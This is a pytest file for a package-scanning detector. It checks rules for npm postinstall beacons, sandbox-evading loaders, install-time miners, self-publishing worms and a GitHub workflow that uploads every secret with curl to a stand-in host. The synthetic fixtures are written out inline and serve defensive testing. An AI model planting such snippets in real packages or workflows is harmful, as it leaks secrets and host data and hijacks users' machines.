"""Research 2026-11-07: npm install-time shapes and a secrets-dump workflow, with look-alikes."""

from __future__ import annotations

from pathlib import Path

import pytest

from skilltotal import engine
from skilltotal.collector import detect_component

CORPUS = Path(__file__).parent / "eval_corpus"
BANNER = "FIXTURE ONLY - synthetic detection test sample, not real malware"


def _ids(root: Path) -> set[str]:
    report = engine.analyze_directory(root, detect_component(root, source=str(root)))
    return {f.id for f in report.findings}


def _write(root: Path, files: dict[str, str]) -> Path:
    for name, text in files.items():
        path = root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(f"// {BANNER}\n{text}" if name.endswith(".js") else text, encoding="utf-8")
    return root


def _pkg(script: str) -> str:
    return (
        '{"name": "fixture-pkg", "version": "1.0.0", "description": "' + BANNER + '", '
        '"scripts": {"postinstall": "' + script + '"}}'
    )


PAIRS = [
    ("ST-NPM-DEPCONF-BEACON", "AST02/dependency-confusion-beacon/bare-ip-hostname-beacon",
     ["AST02/dependency-confusion-beacon/telemetry-named-host",
      "AST02/dependency-confusion-beacon/local-dev-loopback"]),
    ("ST-WORKFLOW-SECRETS-DUMP-EXFIL", "AST01/github-action-secret-exfil/workflow-secrets-dump",
     ["AST01/github-action-secret-exfil/named-secret-deploy-call",
      "AST01/github-action-secret-exfil/secrets-dump-no-upload"]),
    ("ST-NPM-SANDBOX-GATED-LOADER", "AST02/native-addon-dropper-sandbox-gate/gated-addon-loader",
     ["AST02/native-addon-dropper-sandbox-gate/ci-skip-prebuilt-binding"]),
    ("ST-INSTALL-MINER", "AST02/npm-postinstall-miner/miner-script-persistence",
     ["AST02/npm-postinstall-miner/native-build-script"]),
    ("ST-NPM-INSTALL-PUBLISH", "AST02/npm-worm/assembled-publish-join",
     ["AST02/npm-worm/rebuild-command-joined"]),
    ("ST-NPM-INSTALL-PUBLISH", "AST02/npm-worm/printf-fragment-publish",
     ["AST02/npm-worm/rebuild-command-joined"]),
]


@pytest.mark.parametrize(("rule", "positive", "negatives"), PAIRS)
def test_attack_fires_and_look_alike_stays_silent(rule, positive, negatives):
    assert rule in _ids(CORPUS / "positive" / positive)
    for negative in negatives:
        assert rule not in _ids(CORPUS / "negative" / negative)


def test_finding_carries_evidence():
    root = CORPUS / "positive" / "AST02/dependency-confusion-beacon/bare-ip-hostname-beacon"
    report = engine.analyze_directory(root, detect_component(root, source=str(root)))
    finding = next(f for f in report.findings if f.id == "ST-NPM-DEPCONF-BEACON")
    assert len(finding.evidence) == 2
    assert all(e.file == "beacon.js" and e.snippet for e in finding.evidence)


@pytest.mark.parametrize("host", ["10.1.2.3", "192.168.0.9", "172.20.0.4", "127.0.0.1"])
def test_beacon_ignores_private_and_loopback_addresses(tmp_path, host):
    js = (
        'const os = require("os"); const http = require("http");\n'
        f'const r = http.request({{ host: "{host}", method: "POST" }});\n'
        "r.end(JSON.stringify({ h: os.hostname(), d: process.cwd() }));\n"
    )
    root = _write(tmp_path, {"package.json": _pkg("node b.js"), "b.js": js})
    assert "ST-NPM-DEPCONF-BEACON" not in _ids(root)


def test_beacon_needs_the_host_name(tmp_path):
    js = (
        'const http = require("http");\n'
        'const r = http.request({ host: "203.0.113.7", method: "POST" });\n'
        "r.end(process.cwd());\n"
    )
    root = _write(tmp_path, {"package.json": _pkg("node b.js"), "b.js": js})
    assert "ST-NPM-DEPCONF-BEACON" not in _ids(root)


def test_beacon_outside_install_code_is_not_flagged(tmp_path):
    js = (
        'const os = require("os"); const http = require("http");\n'
        'const r = http.request({ host: "203.0.113.7", method: "POST" });\n'
        "r.end(JSON.stringify({ h: os.hostname(), d: process.cwd() }));\n"
    )
    root = _write(tmp_path, {"package.json": _pkg("echo ok"), "lib.js": js})
    assert "ST-NPM-DEPCONF-BEACON" not in _ids(root)


def test_gate_needs_an_analysis_marker_and_a_second_check(tmp_path):
    only_ci = 'if (process.env.GITHUB_ACTIONS) process.exit(0);\nrequire("./a.node");\n'
    only_cgroup = (
        'const fs = require("fs"); fs.readFileSync("/proc/1/cgroup", "utf8");\n'
        'require("./a.node");\n'
    )
    for name, js in (("ci", only_ci), ("cgroup", only_cgroup)):
        root = _write(tmp_path / name, {"package.json": _pkg("node g.js"), "g.js": js})
        assert "ST-NPM-SANDBOX-GATED-LOADER" not in _ids(root)


def test_gate_without_payload_action_is_silent(tmp_path):
    js = (
        'const fs = require("fs");\n'
        'const t = /TracerPid:\\s+0/.test(fs.readFileSync("/proc/self/status", "utf8"));\n'
        "if (process.env.GITHUB_ACTIONS || t) process.exit(0);\n"
    )
    root = _write(tmp_path, {"package.json": _pkg("node g.js"), "g.js": js})
    assert "ST-NPM-SANDBOX-GATED-LOADER" not in _ids(root)


def test_gate_with_detached_child_fires(tmp_path):
    js = (
        'const fs = require("fs"); const { spawn } = require("child_process");\n'
        'const t = /TracerPid:\\s+[1-9]/.test(fs.readFileSync("/proc/self/status", "utf8"));\n'
        'if (!process.env.GITHUB_ACTIONS && !t) spawn("tool", [], { detached: true }).unref();\n'
    )
    root = _write(tmp_path, {"package.json": _pkg("node g.js"), "g.js": js})
    assert "ST-NPM-SANDBOX-GATED-LOADER" in _ids(root)


def test_miner_flags_only_in_install_run_files(tmp_path):
    miner = "./tool --donate-level 1 -o stratum+tcp://pool.example.test:3333\n"
    attack = _write(tmp_path / "a", {"package.json": _pkg("sh run.sh"), "run.sh": miner})
    other = _write(tmp_path / "b", {"package.json": _pkg("echo ok"), "bench.sh": miner})
    assert "ST-INSTALL-MINER" in _ids(attack)
    assert "ST-INSTALL-MINER" not in _ids(other)


def test_workflow_dump_needs_an_offsite_upload(tmp_path):
    wf = (
        "name: x\non: [push]\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - env:\n          ALL: ${{ toJSON(secrets) }}\n"
        '        run: curl -sS -d "$ALL" https://metrics.invalid/u\n'
    )
    uploads = _write(tmp_path / "a", {".github/workflows/cache.yml": wf})
    to_github = _write(
        tmp_path / "b", {".github/workflows/cache.yml": wf.replace("https://metrics.invalid/u",
                                                                    "https://api.github.com/x")}
    )
    assert "ST-WORKFLOW-SECRETS-DUMP-EXFIL" in _ids(uploads)
    assert "ST-WORKFLOW-SECRETS-DUMP-EXFIL" not in _ids(to_github)


def test_publish_joined_from_pieces_in_non_install_code_is_silent(tmp_path):
    js = 'const c = ["np", "m pub", "lish"].join("");\nmodule.exports = c;\n'
    root = _write(tmp_path, {"package.json": _pkg("echo ok"), "release.js": js})
    assert "ST-NPM-INSTALL-PUBLISH" not in _ids(root)
